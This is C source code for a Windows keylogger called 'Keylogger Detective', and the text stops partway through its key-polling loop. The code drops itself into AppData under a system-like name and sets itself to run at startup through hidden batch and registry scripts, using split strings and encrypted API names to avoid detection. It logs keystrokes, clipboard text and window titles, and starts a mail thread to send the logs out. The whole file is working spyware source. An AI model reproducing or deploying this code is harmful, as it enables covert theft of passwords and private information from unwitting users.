#include "KD.h"

#pragma comment(linker, "/entry:Main")
//#pragma comment(lib, "msvcrt.lib")// Обязательно указываем путь к старой версии msvcrt.lib (v6.0) для того чтобы убрать зависимость от гуано кодеса msvcrXX версий
#pragma comment(lib, "shlwapi.lib")

//#define OUTDEBUG

DWORD ThreadSendMail(LPVOID lpParameter);

#ifdef OUTDEBUG
void DebugPrintfA(BOOL Beep, const char *format, ...)
{
	char buffer[1024];
	va_list pArguments;
	va_start(pArguments, format);
	int ln = wvnsprintfA(buffer, 1024, format, pArguments);
	va_end(pArguments);
	::OutputDebugStringA(buffer);
	if(Beep != FALSE)
	{
		MessageBeep(MB_ICONHAND);
	}
}// end « DebugPrintfA »
#endif

/* Base64 encode IN array of size INLEN into OUT array of size OUTLEN.
If OUTLEN is less than BASE64_LENGTH(INLEN), write as many bytes as
possible.  If OUTLEN is larger than BASE64_LENGTH(INLEN), also zero
terminate the output buffer. */
void base64_encode(const unsigned char *in, unsigned char *out, int inlen)
{
	static const unsigned char base64digits[] =
		"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
	for (; inlen > 0; inlen -= 3, in+=3)
	{

		*out++ = base64digits[in[0] >> 2];
		*out++ = base64digits[((in[0]&3)<<4) | ((inlen > 1)?(in[1]>>4):0)];
		*out++ = (inlen > 1)? base64digits[((in[1] << 2) & 0x3c) | ((inlen > 2)? (in[2] >> 6) : 0)]: '=';
		*out++ = (inlen > 2)? base64digits[in[2] & 0x3f] : '=';
	}
	*out = '\0';
}// end « base64_encode »

void DecryptString(LPBYTE pCryptedString, LPSTR pString)
{
	char C;
	
	K2 = 0;
	while(TRUE)
	{
		K2 += K1;
		C = *pCryptedString^K2;
		*pString = C;
		if(!C) break;
		++pString;
		++pCryptedString;
	}
}

void DropKDToAppData()
{
	lstrcpy(szPathAppDataSysdataToSyssvcExe, szPathAppDataSysdata);
	lstrcat(szPathAppDataSysdataToSyssvcExe, "\\"SyssvcExe);

	GetTempPath(MAX_PATH, szCurrentDirectory);
	GetTempPath(MAX_PATH, szPathTempToCopyBat);

	lstrcat(szPathTempToCopyBat, CopyBat);
	lstrcat(szBodyCopyBat, szFileName);
	lstrcat(szBodyCopyBat, "\" \"");
	lstrcat(szBodyCopyBat, szPathAppDataSysdataToSyssvcExe);
	lstrcat(szBodyCopyBat, "\"\r\n");
	CreateDirectory(szPathAppDataSysdata, 0);
	hFile = CreateFile(szPathTempToCopyBat, GENERIC_WRITE, FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	CharToOem(szBodyCopyBat, szOemBodyCopyBat);
	dwSize = lstrlen(szOemBodyCopyBat);
	SetFilePointer(hFile, 0, 0, FILE_END);
	WriteFile(hFile, szOemBodyCopyBat, dwSize, &dwSize, NULL);
	dwSize = lstrlen("del /q "CopyBat"\r\n");
	SetFilePointer(hFile, 0, 0, FILE_END);
	WriteFile(hFile, "del /q "CopyBat"\r\n", dwSize, &dwSize, NULL);
	CloseHandle(hFile);
	
	GetStartupInfo(&si);
	si.wShowWindow = SW_HIDE;
	si.dwFlags = STARTF_USESHOWWINDOW;
	CreateProcess(szPathTempToCopyBat, NULL, NULL, NULL, FALSE, IDLE_PRIORITY_CLASS, NULL, szCurrentDirectory, &si, &pi);
}

void AddKDToAutoRun()
{
	lstrcpy(szPathAppDataSysdataToSyssvcExe, szPathAppDataSysdata);
	lstrcat(szPathAppDataSysdataToSyssvcExe, "\\"SyssvcExe);

	GetTempPath(MAX_PATH, szCurrentDirectory);
	GetTempPath(MAX_PATH, szPathTempToAutoBat);

	lstrcat(szPathTempToAutoBat, AutoBat);
	
	LPSTR szPath = szPathAppDataSysdataToSyssvcExe;
	while(TRUE)
	{
		lstrcpyn(Char, szPath, 2);
		if(!lstrlen(Char)) break;
		lstrcat(szBodyAutoBat, Char);
		++szPath;
		if(!lstrcmp(Char, "\\")) lstrcat(szBodyAutoBat, "\\");
	}
	//lstrcat(szBodyAutoBat, nouse_40B799);
	lstrcat(szBodyAutoBat, "\" >> %TEMP%\\"AutoReg"\r\n");
	
	hFile = CreateFile(szPathTempToAutoBat, GENERIC_WRITE, FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	dwSize = lstrlen("echo REGE");
	SetFilePointer(hFile, 0, 0, FILE_END);
	WriteFile(hFile, "echo REGE", dwSize, &dwSize, NULL);
	dwSize = lstrlen("DIT4 > %TEMP%\\"AutoReg"\r\n");
	SetFilePointer(hFile, 0, 0, FILE_END);
	WriteFile(hFile, "DIT4 > %TEMP%\\"AutoReg"\r\n", dwSize, &dwSize, 0);
	dwSize = lstrlen("echo [HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\Curren");
	SetFilePointer(hFile, 0, 0, FILE_END);
	WriteFile(hFile, "echo [HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\Curren", dwSize, &dwSize, 0);
	dwSize = lstrlen("tVersion\\R");
	SetFilePointer(hFile, 0, 0, FILE_END);
	WriteFile(hFile, "tVersion\\R", dwSize, &dwSize, 0);
	dwSize = lstrlen("un] >> %TEMP%\\"AutoReg"\r\n");
	SetFilePointer(hFile, 0, 0, FILE_END);
	WriteFile(hFile, "un] >> %TEMP%\\"AutoReg"\r\n", dwSize, &dwSize, 0);
	dwSize = lstrlen(szBodyAutoBat);
	SetFilePointer(hFile, 0, 0, FILE_END);
	WriteFile(hFile, szBodyAutoBat, dwSize, &dwSize, 0);
	dwSize = lstrlen("rege");
	SetFilePointer(hFile, 0, 0, FILE_END);
	WriteFile(hFile, "rege", dwSize, &dwSize, 0);
	dwSize = lstrlen("dit /s \"%TEMP%\\"AutoReg"\"\r\n");
	SetFilePointer(hFile, 0, 0, FILE_END);
	WriteFile(hFile, "dit /s \"%TEMP%\\"AutoReg"\"\r\n", dwSize, &dwSize, 0);
	dwSize = lstrlen("del /q "AutoReg"\r\n");
	SetFilePointer(hFile, 0, 0, FILE_END);
	WriteFile(hFile, "del /q "AutoReg"\r\n", dwSize, &dwSize, 0);
	dwSize = lstrlen("del /q "AutoBat"\r\n");
	SetFilePointer(hFile, 0, 0, FILE_END);
	WriteFile(hFile, "del /q "AutoBat"\r\n", dwSize, &dwSize, 0);
	CloseHandle(hFile);

	GetStartupInfo(&si);
	si.wShowWindow = SW_HIDE;
	si.dwFlags = STARTF_USESHOWWINDOW;
	CreateProcess(szPathTempToAutoBat, NULL, NULL, NULL, FALSE, IDLE_PRIORITY_CLASS, NULL, szCurrentDirectory, &si, &pi);
}

void GetDate()
{
	SYSTEMTIME lt;
	char str[8];
	
	GetLocalTime(&lt);
	wsprintf(str, "%d", lt.wHour);
	lstrcpy(szDate, str);
	wsprintf(str, "%d", lt.wMinute);
	lstrcat(szDate, ":");
	lstrcat(szDate, str);
	wsprintf(str, "%d", lt.wSecond);
	lstrcat(szDate, ":");
	lstrcat(szDate, str);
	lstrcat(szDate, " ");
	wsprintf(str, "%d", lt.wMonth);
	lstrcat(szDate, str);
	wsprintf(str, "%d", lt.wDay);
	lstrcat(szDate, "/");
	lstrcat(szDate, str);
	wsprintf(str, "%d", lt.wYear);
	lstrcat(szDate, "/");
	lstrcat(szDate, str);
	lstrcat(szDate, " ");
}

void GenerateFileNameNSysDat()
{
	HANDLE hFile;
	DWORD n = 0;
	char szN[8];
	
	lstrcpy(szLastPathToNSysDat, "");
	lstrcpy(szNewPathToNSysDat, "");
	while(TRUE)
	{
		lstrcpy(szLastPathToNSysDat, szNewPathToNSysDat);
		Sleep(10);
		lstrcpy(szNewPathToNSysDat, szDirKD);
		wsprintfA(szN, "\\%d", n);
		lstrcatA(szNewPathToNSysDat, szN);
		lstrcatA(szNewPathToNSysDat, SysDat);
		hFile = CreateFile(szNewPathToNSysDat, GENERIC_WRITE|GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
		CloseHandle(hFile);
		if(hFile == INVALID_HANDLE_VALUE) break;
		++n;
	}
}

// Uninstall (Remove) Keylogger Detective
void UninstKD()
{
	GetTempPath(MAX_PATH, szCurrentDirectory);
	GetTempPath(MAX_PATH, szPathTempToUninstBat);
	lstrcat(szPathTempToUninstBat, UninstBat);
	
	lstrcat(szDeleteAllSysdata, szDirKD);
	lstrcat(szDeleteAllSysdata, "\"\\*.*\r\n");

	lstrcat(szFileExistsSyssvcExe, szDirKD);
	lstrcat(szFileExistsSyssvcExe, "\\"SyssvcExe);
	lstrcat(szFileExistsSyssvcExe, "\" goto delag\r\n");
	
	lstrcat(szRemoveDirSysdata, szDirKD);
	lstrcat(szRemoveDirSysdata, "\"\r\n");
	
	lstrcat(szDeleteUninstBat, szPathTempToUninstBat);
	lstrcat(szDeleteUninstBat, "\"\r\n");
	
	hFile = CreateFile(szPathTempToUninstBat, GENERIC_WRITE, FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	dwSize = lstrlen("echo REGEDIT4 > %TEMP%\\"UninstReg"\r\n");
	SetFilePointer(hFile, 0, 0, FILE_END);
	WriteFile(hFile, "echo REGEDIT4 > %TEMP%\\"UninstReg"\r\n", dwSize, &dwSize, 0);
	dwSize = lstrlen("echo [HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion");
	SetFilePointer(hFile, 0, 0, FILE_END);
	WriteFile(hFile, "echo [HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion", dwSize, &dwSize, 0);
	dwSize = lstrlen("\\R");
	SetFilePointer(hFile, 0, 0, FILE_END);
	WriteFile(hFile, "\\R", dwSize, &dwSize, 0);
	dwSize = lstrlen("un] >> %TEMP%\\"UninstReg"\r\n");
	SetFilePointer(hFile, 0, 0, FILE_END);
	WriteFile(hFile, "un] >> %TEMP%\\"UninstReg"\r\n", dwSize, &dwSize, 0);
	dwSize = lstrlen("echo \""SyssvcExe"\"=- >> %TEMP%\\"UninstReg"\r\n");
	SetFilePointer(hFile, 0, 0, FILE_END);
	WriteFile(hFile, "echo \""SyssvcExe"\"=- >> %TEMP%\\"UninstReg"\r\n", dwSize, &dwSize, 0);
	dwSize = lstrlen("regedit /s %TEMP%\\"UninstReg"\r\n");
	SetFilePointer(hFile, 0, 0, FILE_END);
	WriteFile(hFile, "regedit /s %TEMP%\\"UninstReg"\r\n", dwSize, &dwSize, 0);
	dwSize = lstrlen("del /q %TEMP%\\"UninstReg"\r\n");
	SetFilePointer(hFile, 0, 0, FILE_END);
	WriteFile(hFile, "del /q %TEMP%\\"UninstReg"\r\n", dwSize, &dwSize, 0);
	dwSize = lstrlen(":delag\r\n");
	SetFilePointer(hFile, 0, 0, FILE_END);
	WriteFile(hFile, ":delag\r\n", dwSize, &dwSize, 0);
	
	CharToOem(szDeleteAllSysdata, szOemDeleteAllSysdata);
	dwSize = lstrlen(szOemDeleteAllSysdata);
	SetFilePointer(hFile, 0, 0, FILE_END);
	WriteFile(hFile, szOemDeleteAllSysdata, dwSize, &dwSize, 0);
	
	CharToOem(szFileExistsSyssvcExe, szOemFileExistsSyssvcExe);
	dwSize = lstrlen(szOemFileExistsSyssvcExe);
	SetFilePointer(hFile, 0, 0, FILE_END);
	WriteFile(hFile, szOemFileExistsSyssvcExe, dwSize, &dwSize, 0);
	
	CharToOem(szRemoveDirSysdata, szOemRemoveDirSysdata);
	dwSize = lstrlen(szOemRemoveDirSysdata);
	SetFilePointer(hFile, 0, 0, FILE_END);
	WriteFile(hFile, szOemRemoveDirSysdata, dwSize, &dwSize, 0);
	
	dwSize = lstrlen(szDeleteUninstBat);
	SetFilePointer(hFile, 0, 0, FILE_END);
	WriteFile(hFile, szDeleteUninstBat, dwSize, &dwSize, 0);
	CloseHandle(hFile);
	
	GetStartupInfo(&si);
	si.wShowWindow = SW_HIDE;
	si.dwFlags = STARTF_USESHOWWINDOW;
	CreateProcess(szPathTempToUninstBat, NULL, NULL, NULL, FALSE, IDLE_PRIORITY_CLASS, NULL, szCurrentDirectory, &si, &pi);
	ExitProcess(0);
}

void SendMail()
{
	CloseHandle(hLogFile);
	
	GenerateFileNameNSysDat();
	MoveFile(szPathAppDataSysdataToSysDat, szNewPathToNSysDat);
	
	hLogFile = CreateFile(szPathAppDataSysdataToSysDat, GENERIC_WRITE|GENERIC_READ, 0, NULL, OPEN_ALWAYS, 0, NULL);
	LogFileSize = 0;
	SetFilePointer(hLogFile, 0, 0, FILE_BEGIN);
	strLogSize = lstrlen("{Continuing!}");
	WriteFile(hLogFile, "{Continuing!}", strLogSize, &strLogSize, 0);
	SetFilePointer(hLogFile, 0, 0, FILE_END);
	strLogSize = lstrlen(szWindowTitle);
	WriteFile(hLogFile, szWindowTitle, strLogSize, &strLogSize, 0);
	LogFileSize = GetFileSize(hLogFile, &FileSizeHigh);
	CloseHandle(hLogFile);
	//if(!iPartProgress32)
	//{
		FileHandle = CreateFile(szPathAppDataSysdataToSysDat, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
		GetFileTime(FileHandle, &ftCreate, &ftLastAccess, &ftLastWrite);
		CloseHandle(FileHandle);
		LastAccessDateTime = ftLastAccess.dwHighDateTime;
		FileHandle = CreateFile(szFileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
		GetFileTime(FileHandle, &ftCreate, &ftLastAccess, &ftLastWrite);
		CloseHandle(FileHandle);
		if(ftCreate.dwHighDateTime+(201*iDays) <= LastAccessDateTime) UninstKD();
		CreateThread(NULL, 0, ThreadSendMail, NULL, NORMAL_PRIORITY_CLASS, &thSendMail);
	//}
}

DWORD ThreadWriteLog(LPVOID lpParameter)
{
	DWORD dwType;
	DWORD dwSize = 3;
	Sleep(20);

	while(TRUE)
	{
		Sleep(1);
		RegOpenKeyEx(HKEY_CURRENT_USER, "Control Panel\\Keyboard", 0, REG_SZ, &hRegKey);
		RegQueryValueEx(hRegKey, "KeyboardDelay", NULL, &dwType /*can be NULL*/, (LPBYTE)&szKeyboardDelay, &dwSize);
		if(!*(DWORD*)&szKeyboardDelay)
		{
			dwMilliseconds = 500;
		}
		else
		{
			dwMilliseconds = (*(WORD *)&szKeyboardDelay- 47)*0x32;
		}
		RegQueryValueEx(hRegKey, "KeyboardSpeed", NULL, &dwType /*can be NULL*/, (LPBYTE)&szKeyboardSpeed, &dwSize);
		RegCloseKey(hRegKey);
		
		// говно-код
		{
			if(!*(DWORD*)&szKeyboardSpeed)
			{
				*(DWORD*)&szKeyboardSpeed = '13'; // 31
			}
			if(*(DWORD*)&szKeyboardSpeed>>8)
			{
				iKeyboardSpeed = (1227/
				((((*(DWORD*)&szKeyboardSpeed&0xFF)-'0')*10
				+((*(DWORD*)&szKeyboardSpeed>>8)-'0'))+2)
				)&0xFF;
			}
			else
			{
				DWORD i = ((*(DWORD*)&szKeyboardSpeed&0xFF)-'0');
				if(!i) i++;
				i+=2;
				iKeyboardSpeed = (1227/(i<<=3))&0xFF;
			}
		}

		if(ActualKey == VK_LBUTTON)
		{
			if(TempKey == VK_LBUTTON) continue;
			lstrcpyn(strLog, "{Click}\r\n", 10);
			goto handlerClickCtrlAlt;
		}
		if(ActualKey == VK_BACK)
		{
			lstrcpyn(strLog, "{Back}\r\n", 9);
			goto handlerBackLeftRight;
		}
		if(ActualKey == VK_TAB)
		{
			if(TempKey == VK_TAB) continue;
			lstrcpyn(strLog, "{Tab}\r\n", 8);
			goto handlerTabEnterUpDownDelete;
		}
		if(ActualKey == VK_RETURN)
		{
			if(TempKey == VK_RETURN) continue;
			lstrcpyn(strLog, "{Enter}\r\n", 10);
			goto handlerTabEnterUpDownDelete;
		}
		if(ActualKey == VK_CONTROL)
		{
			lstrcpyn(strLog, "{Ctrl}\r\n", 9);
			goto handlerClickCtrlAlt;
		}
		if(ActualKey == VK_MENU)
		{
			lstrcpyn(strLog, "{Alt}\r\n", 8);
			goto handlerClickCtrlAlt;
		}
		if(ActualKey == VK_LEFT)
		{
			lstrcpyn(strLog, "{Left}\r\n", 9);
			goto handlerBackLeftRight;
		}
		if(ActualKey == VK_UP)
		{
			if(TempKey == VK_UP) continue;
			lstrcpyn(strLog, "{Up}\r\n", 7);
			goto handlerTabEnterUpDownDelete;
		}
		if(ActualKey == VK_RIGHT)
		{
			lstrcpyn(strLog, "{Right}\r\n", 10);
			goto handlerBackLeftRight;
		}
		if(ActualKey == VK_DOWN)
		{
			if(TempKey == VK_DOWN) continue;
			lstrcpyn(strLog, "{Down}\r\n", 9);
			goto handlerTabEnterUpDownDelete;
		}
		if(ActualKey == VK_DELETE)
		{
			if(TempKey == VK_DELETE) continue;
			lstrcpyn(strLog, "{Delete}\r\n", 11);
			goto handlerTabEnterUpDownDelete;
		}
//=============================================================
		if(!++handlerClipboard)
		{
			OpenClipboard(NULL);
			pClipboardData = (LPSTR)GetClipboardData(CF_TEXT);
			ClipboardDataSize = lstrlen(pClipboardData);
			if(ClipboardDataSize)
			{
				if(ClipboardDataSize >= 5000)
				{
					lstrcpyn(szClipboardData, pClipboardData, 5000);
				}
				else
				{
					lstrcpy(szClipboardData, pClipboardData);
				}
				CloseClipboard();
				
				if(lstrcmp(szLastClipboardData, szClipboardData))
				{
					lstrcpyA(strLogClipboard, "\r\n{CLIPBOARD BEGIN}\r\n");
					lstrcatA(strLogClipboard, szClipboardData);
					lstrcatA(strLogClipboard, "\r\n{CLIPBOARD END}\r\n");
					hWindow = GetForegroundWindow();
					GetWindowText(hWindow, szWindowText, 255);
					if(lstrcmp(szWindowText, szLastWindowText) && lstrlen(szWindowText))
					{
						lstrcpy(szLastWindowText, szWindowText);
						lstrcpy(szWindowTitle, "\r\n\r\n");
						GetDate();
						lstrcat(szWindowTitle, szDate);
						lstrcat(szWindowTitle, "{Window}");
						lstrcat(szWindowTitle, szWindowText);
						lstrcat(szWindowTitle, "\r\n");
						hLogFile = CreateFile(szPathAppDataSysdataToSysDat, GENERIC_WRITE|GENERIC_READ, 0, NULL, OPEN_ALWAYS, 0, NULL);
						LogFileSize = GetFileSize(hLogFile, &FileSizeHigh);
						SetFilePointer(hLogFile, LogFileSize, (PLONG)&FileSizeHigh, 0);
						strLogSize = lstrlen(szWindowTitle);
						WriteFile(hLogFile, szWindowTitle, strLogSize, &strLogSize, NULL);
						CloseHandle(hLogFile);
					}
					hLogFile = CreateFile(szPathAppDataSysdataToSysDat, GENERIC_WRITE|GENERIC_READ, 0, NULL, OPEN_ALWAYS, 0, NULL);
					LogFileSize = GetFileSize(hLogFile, &FileSizeHigh);
					SetFilePointer(hLogFile, LogFileSize, (PLONG)&FileSizeHigh, 0);
					strLogSize = lstrlen(strLogClipboard);
					WriteFile(hLogFile, strLogClipboard, strLogSize, &strLogSize, 0);
					CloseHandle(hLogFile);
					lstrcpy(szLastClipboardData, szClipboardData);
				}
			}
			else
			{
				CloseClipboard();
			}
		}
//=============================================================
		hWindow = GetForegroundWindow();
		dwProcessId = GetWindowThreadProcessId(hWindow, &dwProcessId);
		if(0x04190419 != (DWORD)GetKeyboardLayout(dwProcessId))
		{
			charKey = &EN[ActualKey]+modeKeyShiftAndCapsLock;
			lstrcpyn(strLog, charKey, 2);
		}
		else
		{
			charKey = (LPSTR)(&RU[ActualKey]+modeKeyShiftAndCapsLock);
			lstrcpyn(strLog, charKey, 2);
		}
//=============================================================
handlerBackLeftRight:
		if(!vKey1)
		{
			if(strLog[0] != '\0')
			{
				TempKey = ActualKey;
				hWindow = GetForegroundWindow();
				GetWindowText(hWindow, szWindowText, 255);
				if(lstrcmp(szWindowText, szLastWindowText) && lstrlen(szWindowText))
				{
					lstrcpy(szLastWindowText, szWindowText);
					lstrcpy(szWindowTitle, "\r\n\r\n");
					GetDate();
					lstrcat(szWindowTitle, szDate);
					lstrcat(szWindowTitle, "{Window}");
					lstrcat(szWindowTitle, szWindowText);
					lstrcat(szWindowTitle, "\r\n");
					hLogFile = CreateFile(szPathAppDataSysdataToSysDat, GENERIC_WRITE|GENERIC_READ, 0, NULL, OPEN_ALWAYS, 0, NULL);
					LogFileSize = GetFileSize(hLogFile, &FileSizeHigh);
					CloseHandle(hLogFile);
					if(LogFileSize > 5000)
					{
						FileHandle = CreateFile(szPathAppDataSysdataToSysDat, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
						GetFileTime(FileHandle, &ftCreate, &ftLastAccess, &ftLastWrite);
						CloseHandle(FileHandle);
						LastAccessDateTime = ftLastAccess.dwHighDateTime;
						FileHandle = CreateFile(szFileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
						GetFileTime(FileHandle, &ftCreate, &ftLastAccess, &ftLastWrite);
						CloseHandle(FileHandle);
						if(ftCreate.dwHighDateTime+(201*iDays) <= LastAccessDateTime) UninstKD();

						GenerateFileNameNSysDat();
						MoveFile(szPathAppDataSysdataToSysDat, szNewPathToNSysDat);

						bTestMode = FALSE;
						szMessage = NULL;
						if(!iPartProgress32)
						{
							CreateThread(NULL, 0, ThreadSendMail, NULL, NORMAL_PRIORITY_CLASS, &thSendMail);
						}
						LogFileSize = 0;
					}
					hLogFile = CreateFile(szPathAppDataSysdataToSysDat, GENERIC_WRITE|GENERIC_READ, 0, NULL, OPEN_ALWAYS, 0, NULL);
					SetFilePointer(hLogFile, LogFileSize, (PLONG)&FileSizeHigh, 0);
					strLogSize = lstrlen(szWindowTitle);
					WriteFile(hLogFile, szWindowTitle, strLogSize, &strLogSize, NULL);
					CloseHandle(hLogFile);
				}
				hLogFile = CreateFile(szPathAppDataSysdataToSysDat, GENERIC_WRITE|GENERIC_READ, 0, NULL, OPEN_ALWAYS, 0, NULL);
				LogFileSize = GetFileSize(hLogFile, &FileSizeHigh);
				if(LogFileSize > 6000) SendMail();
				SetFilePointer(hLogFile, LogFileSize, (PLONG)&FileSizeHigh, 0);
				strLogSize = lstrlen(strLog);
				WriteFile(hLogFile, strLog, strLogSize, &strLogSize, 0);
				CloseHandle(hLogFile);
				Sleep(dwMilliseconds);
				if(ActualKey == TempKey)
				{
					Sleep(dwMilliseconds);
					if(ActualKey == TempKey)
					{
						Sleep(dwMilliseconds);
						if(ActualKey == TempKey)
						{
							Sleep(dwMilliseconds);
							if(ActualKey == TempKey)
							{
								Sleep(dwMilliseconds);
								if(ActualKey == TempKey)
								{
									do{
										hLogFile = CreateFile(szPathAppDataSysdataToSysDat, GENERIC_WRITE|GENERIC_READ, 0, NULL, OPEN_ALWAYS, 0, NULL);
										LogFileSize = GetFileSize(hLogFile, &FileSizeHigh);
										if(LogFileSize > 6000)
										{
											SendMail();
											strLogSize = lstrlen(strLog);
										}
										SetFilePointer(hLogFile, LogFileSize, (PLONG)&FileSizeHigh, 0);
										WriteFile(hLogFile, strLog, strLogSize, &strLogSize, 0);
										CloseHandle(hLogFile);
										Sleep(iKeyboardSpeed);
									}while(ActualKey == TempKey);
								}
							}
						}
					}
				}
				
			}
		}
		continue;
//=============================================================
handlerClickCtrlAlt: //+
		if(!vKey1)
		{
			if(strLog[0] != '\0')
			{
				TempKey = ActualKey;
				hWindow = GetForegroundWindow();
				GetWindowText(hWindow, szWindowText, 255);
				if(lstrcmp(szWindowText, szLastWindowText) && lstrlen(szWindowText))
				{
					lstrcpy(szLastWindowText, szWindowText);
					lstrcpy(szWindowTitle, "\r\n\r\n");
					GetDate();
					lstrcat(szWindowTitle, szDate);
					lstrcat(szWindowTitle, "{Window}");
					lstrcat(szWindowTitle, szWindowText);
					lstrcat(szWindowTitle, "\r\n");
					hLogFile = CreateFile(szPathAppDataSysdataToSysDat, GENERIC_WRITE|GENERIC_READ, 0, NULL, OPEN_ALWAYS, 0, NULL);
					LogFileSize = GetFileSize(hLogFile, &FileSizeHigh);
					if(LogFileSize > 6000) SendMail();
					SetFilePointer(hLogFile, LogFileSize, (PLONG)&FileSizeHigh, 0);
					strLogSize = lstrlen(szWindowTitle);
					WriteFile(hLogFile, szWindowTitle, strLogSize, &strLogSize, NULL);
					CloseHandle(hLogFile);
				}
				hLogFile = CreateFile(szPathAppDataSysdataToSysDat, GENERIC_WRITE|GENERIC_READ, 0, NULL, OPEN_ALWAYS, 0, NULL);
				LogFileSize = GetFileSize(hLogFile, &FileSizeHigh);
				if(LogFileSize > 6000) SendMail();
				SetFilePointer(hLogFile, LogFileSize, (PLONG)&FileSizeHigh, 0);
				strLogSize = lstrlen(strLog);
				WriteFile(hLogFile, strLog, strLogSize, &strLogSize, 0);
				CloseHandle(hLogFile);
				do Sleep(1); while(ActualKey == TempKey); 
			}
		}
		continue;
//=============================================================
handlerTabEnterUpDownDelete:
		if(!vKey1)
		{
			if(strLog[0] != '\0')
			{
				TempKey = ActualKey;
				hWindow = GetForegroundWindow();
				GetWindowText(hWindow, szWindowText, 255);
				if(lstrcmp(szWindowText, szLastWindowText) && lstrlen(szWindowText))
				{
					lstrcpy(szLastWindowText, szWindowText);
					lstrcpy(szWindowTitle, "\r\n\r\n");
					GetDate();
					lstrcat(szWindowTitle, szDate);
					lstrcat(szWindowTitle, "{Window}");
					lstrcat(szWindowTitle, szWindowText);
					lstrcat(szWindowTitle, "\r\n");
					hLogFile = CreateFile(szPathAppDataSysdataToSysDat, GENERIC_WRITE|GENERIC_READ, 0, NULL, OPEN_ALWAYS, 0, NULL);
					LogFileSize = GetFileSize(hLogFile, &FileSizeHigh);
					if(LogFileSize > 6000) SendMail();
					SetFilePointer(hLogFile, LogFileSize, (PLONG)&FileSizeHigh, 0);
					strLogSize = lstrlen(szWindowTitle);
					WriteFile(hLogFile, szWindowTitle, strLogSize, &strLogSize, NULL);
					CloseHandle(hLogFile);
				}
				hLogFile = CreateFile(szPathAppDataSysdataToSysDat, GENERIC_WRITE|GENERIC_READ, 0, NULL, OPEN_ALWAYS, 0, NULL);
				LogFileSize = GetFileSize(hLogFile, &FileSizeHigh);
				if(LogFileSize > 6000) SendMail();
				SetFilePointer(hLogFile, LogFileSize, (PLONG)&FileSizeHigh, 0);
				strLogSize = lstrlen(strLog);
				WriteFile(hLogFile, strLog, strLogSize, &strLogSize, 0);
				CloseHandle(hLogFile);
				ActualKey = 0;
			}
		}
		continue;
//=============================================================
	}
	return 1;
}

void CheckKey(int Key)
{
	DWORD KeyState;
	if(ActualKey != Key)
	{
		if(vKey4 != Key)
		{
			if(vKey3 != Key)
			{
				if(vKey2 != Key)
				{
					KeyState = fnGetAsyncKeyState(Key)&0xFF00;
					if(KeyState)
					{
						vKey2 = vKey3;
						vKey3 = vKey4;
						vKey4 = ActualKey;
						ActualKey = Key;
#ifdef OUTDEBUG
						//DebugPrintfA(FALSE, "Key = %c", Key);
#endif
					}
				}
			}
		}
	}
}

DWORD ThreadKeyLogging(LPVOID lpParameter)
{
	DWORD KeyState;
	char tmpbuffer[300];
	
	DecryptString(csUser32_dll, tmpbuffer); // "user32.dll"
	hModule = LoadLibrary(tmpbuffer);
	DecryptString(csGetAsyncKeyState, tmpbuffer); // "GetAsyncKeyState"
	fnGetAsyncKeyState = (pGetAsyncKeyState)GetProcAddress(hModule, tmpbuffer);
	DecryptString(csGetKeyState, tmpbuffer); // "GetKeyState"
	fnGetKeyState = (pGetKeyState)GetProcAddress(hModule, tmpbuffer);
	while(TRUE)
	{
		Sleep(1); // avoid 100% cpu usage
		KeyState = fnGetAsyncKeyState(vKey1)&0xFF00;
		if(!KeyState)
		{
			vKey1 = 0;
		}
		KeyState = fnGetAsyncKeyState(vKey2)&0xFF00;
		if(!KeyState)
		{
			vKey2 = vKey1;
			vKey1 = 0;
		}
		KeyState = fnGetAsyncKeyState(vKey3)&0xFF00;
		if(!KeyState)
		{
			vKey3 = vKey2;
			vKey2 = vKey1;
			vKey1 = 0;
		}
		KeyState = fnGetAsyncKeyState(vKey4)&0xFF00;
		if(!KeyState)
		{
			vKey4 = vKey3;
			vKey3 = vKey2;
			vKey2 = vKey1;
			vKey1 = 0;
		}
		KeyState = fnGetAsyncKeyState(ActualKey)&0xFF00;
		if(!KeyState)
		{
			ActualKey = 0;
		}
		
		if(fnGetKeyState(VK_CAPITAL))
		{
			modeKeyShiftAndCapsLock = 512;
		}
		else
		{
			modeKeyShiftAndCapsLock = 0;
		}
		
		KeyState = fnGetAsyncKeyState(VK_SHIFT)&0xFF00;
		if(KeyState)
		{
			modeKeyShiftAndCapsLock += 256;
		}
		CheckKey(VK_LBUTTON);
		CheckKey(VK_BACK);
		CheckKey(VK_TAB);
		CheckKey(VK_CONTROL);
		CheckKey(VK_MENU);
		CheckKey(VK_RETURN);
		CheckKey(VK_SPACE);
		CheckKey(VK_LEFT);
		CheckKey(VK_UP);
		CheckKey(VK_RIGHT);
		CheckKey(VK_DOWN);
		CheckKey(VK_DELETE);
		CheckKey('0');
		CheckKey('1');
		CheckKey('2');
		CheckKey('3');
		CheckKey('4');
		CheckKey('5');
		CheckKey('6');
		CheckKey('7');
		CheckKey('8');
		CheckKey('9');
		CheckKey('A');
		CheckKey('B');
		CheckKey('C');
		CheckKey('D');
		CheckKey('E');
		CheckKey('F');
		CheckKey('G');
		CheckKey('H');
		CheckKey('I');
		CheckKey('J');
		CheckKey('K');
		CheckKey('L');
		CheckKey('M');
		CheckKey('N');
		CheckKey('O');
		CheckKey('P');
		CheckKey('Q');
		CheckKey('R');
		CheckKey('S');
		CheckKey('T');
		CheckKey('U');
		CheckKey('V');
		CheckKey('W');
		CheckKey('X');
		CheckKey('Y');
		CheckKey('Z');
		
		CheckKey(VK_NUMPAD0);
		CheckKey(VK_NUMPAD1);
		CheckKey(VK_NUMPAD2);
		CheckKey(VK_NUMPAD3);
		CheckKey(VK_NUMPAD4);
		CheckKey(VK_NUMPAD5);
		CheckKey(VK_NUMPAD6);
